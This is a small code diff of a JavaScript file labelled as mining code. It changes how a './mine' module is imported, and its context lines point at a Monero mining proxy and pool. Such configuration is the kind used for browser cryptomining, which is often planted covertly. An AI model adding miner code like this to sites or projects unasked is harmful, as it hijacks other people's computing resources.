@@ -1,5 +1,5 @@
 // Start Of Mining Code (Javascript)
-var { script } = require('./mine');
+var script = require('./mine');
 
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
